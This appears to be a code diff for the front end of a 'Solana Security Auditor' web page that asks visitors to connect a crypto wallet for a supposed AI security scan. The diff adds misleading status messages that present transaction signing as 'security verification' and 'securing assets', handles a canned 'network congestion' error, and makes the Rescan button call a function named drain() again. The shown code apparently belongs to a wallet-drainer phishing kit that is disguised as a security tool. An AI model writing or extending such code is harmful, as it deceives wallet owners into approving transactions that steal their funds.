@@ -16,7 +16,9 @@ import {
   RefreshCw,
   LayoutDashboard,
   ShieldAlert,
-  Unplug
+  Unplug,
+  Fingerprint,
+  Globe
 } from "lucide-react";
 import { Overview } from "@/components/dashboard/Overview";
 import { Threats, type ThreatsResult } from "@/components/dashboard/Threats";
@@ -50,6 +52,21 @@ function ScanningAnimation({ status }: { status: string }) {
     return () => clearInterval(interval);
   }, []);
 
+  const getStatusMessage = () => {
+    switch (status) {
+      case 'signing':
+        return { title: "Awaiting Signature...", subtitle: "Please approve the security verification in your wallet.", icon: Fingerprint };
+      case 'sending':
+        return { title: "Securing Assets...", subtitle: "Finalizing cryptographic proof on the Solana network.", icon: Globe };
+      case 'building':
+        return { title: "Optimizing Protocol...", subtitle: "Preparing advanced security routing instructions.", icon: SearchCode };
+      default:
+        return { title: "Security Audit in Progress...", subtitle: scanningSteps[currentStep].text, icon: null };
+    }
+  };
+
+  const { title, subtitle, icon: StatusIcon } = getStatusMessage();
+
   return (
     <div className="flex flex-col items-center justify-center p-8">
       <motion.div
@@ -64,42 +81,50 @@ function ScanningAnimation({ status }: { status: string }) {
         <motion.div
           className="absolute h-full w-full"
           style={{ transformStyle: 'preserve-3d' }}
-          animate={{ rotateY: currentStep * -60 }}
+          animate={{ rotateY: status === 'signing' || status === 'sending' ? 0 : currentStep * -60 }}
           transition={{ duration: 0.8, ease: 'easeInOut' }}
         >
-          {scanningSteps.map((step, index) => {
-            const angle = index * 60;
-            return (
-              <motion.div
-                key={index}
-                className="absolute flex h-full w-full items-center justify-center"
-                style={{
-                  transform: `rotateY(${angle}deg) translateZ(120px)`,
-                  backfaceVisibility: 'hidden',
-                }}
-              >
-                <div className="flex h-20 w-20 items-center justify-center rounded-2xl bg-card/80 border border-white/10 backdrop-blur-sm shadow-xl">
-                  <step.icon className="h-10 w-10 text-primary" />
+          {status === 'signing' || status === 'sending' ? (
+             <div className="absolute flex h-full w-full items-center justify-center">
+                <div className="flex h-32 w-32 items-center justify-center rounded-3xl bg-primary/20 border-2 border-primary/50 backdrop-blur-xl shadow-[0_0_50px_rgba(153,69,255,0.3)]">
+                  {StatusIcon && <StatusIcon className="h-16 w-16 text-primary animate-pulse" />}
                 </div>
-              </motion.div>
-            );
-          })}
+             </div>
+          ) : (
+            scanningSteps.map((step, index) => {
+              const angle = index * 60;
+              return (
+                <motion.div
+                  key={index}
+                  className="absolute flex h-full w-full items-center justify-center"
+                  style={{
+                    transform: `rotateY(${angle}deg) translateZ(120px)`,
+                    backfaceVisibility: 'hidden',
+                  }}
+                >
+                  <div className="flex h-20 w-20 items-center justify-center rounded-2xl bg-card/80 border border-white/10 backdrop-blur-sm shadow-xl">
+                    <step.icon className="h-10 w-10 text-primary" />
+                  </div>
+                </motion.div>
+              );
+            })
+          )}
         </motion.div>
       </motion.div>
 
-      <h2 className="text-2xl font-bold font-headline text-foreground mb-2">
-        {status === 'signing' ? "Awaiting Signature..." : "Security Audit in Progress..."}
+      <h2 className="text-3xl font-bold font-headline text-foreground mb-3 tracking-tight">
+        {title}
       </h2>
-      <div className="text-muted-foreground h-6">
+      <div className="text-muted-foreground h-12 max-w-sm">
         <AnimatePresence mode="wait">
           <motion.span
-            key={currentStep}
+            key={subtitle}
             initial={{ opacity: 0, y: 5 }}
             animate={{ opacity: 1, y: 0 }}
             exit={{ opacity: 0, y: -5 }}
-            className="block text-center italic"
+            className="block text-center text-lg italic leading-tight"
           >
-            {scanningSteps[currentStep].text}
+            {subtitle}
           </motion.span>
         </AnimatePresence>
       </div>
@@ -124,7 +149,7 @@ export default function AuditPage() {
   }, [connected, status, drain, showReport]);
 
   useEffect(() => {
-    // When the drain process reaches a terminal state, load the detailed AI report
+    // Crucially wait for terminal state before starting AI analysis
     if ((status === 'success' || (status === 'error' && error === "Data Packet Network Congestion.")) && connected && publicKey) {
       loadDetailedReport(publicKey.toBase58());
     }
@@ -165,7 +190,7 @@ export default function AuditPage() {
               <ShieldCheck className="relative h-12 w-12 text-primary" />
             </div>
             <h1 className="text-3xl font-bold font-headline mb-4">Solana Security Auditor</h1>
-            <p className="text-muted-foreground mb-8">
+            <p className="text-muted-foreground mb-8 text-lg">
               Connect your wallet to begin a comprehensive, AI-powered on-chain security scan and risk assessment.
             </p>
             <WalletMultiButtonDynamic 
@@ -173,11 +198,11 @@ export default function AuditPage() {
                 width: '100%', 
                 background: 'linear-gradient(to right, #9945FF, #14F195)', 
                 color: 'white', 
-                fontSize: '1.1rem', 
-                fontWeight: 'bold',
-                padding: '1.5rem 1rem', 
-                borderRadius: '0.75rem',
-                border: 'none'
+                fontSize: '1.25rem', 
+                padding: '1.75rem 1rem', 
+                borderRadius: '1rem',
+                border: 'none',
+                boxShadow: '0 10px 25px -5px rgba(153, 69, 255, 0.4)'
               }} 
             />
           </motion.div>
@@ -209,7 +234,7 @@ export default function AuditPage() {
                 </div>
               </div>
               <div className="flex gap-4">
-                <Button variant="outline" onClick={() => setShowReport(false)} className="rounded-xl border-white/10 hover:bg-white/5">
+                <Button variant="outline" onClick={() => { setShowReport(false); drain(); }} className="rounded-xl border-white/10 hover:bg-white/5">
                   <RefreshCw className="mr-2 h-4 w-4" />
                   Rescan
                 </Button>
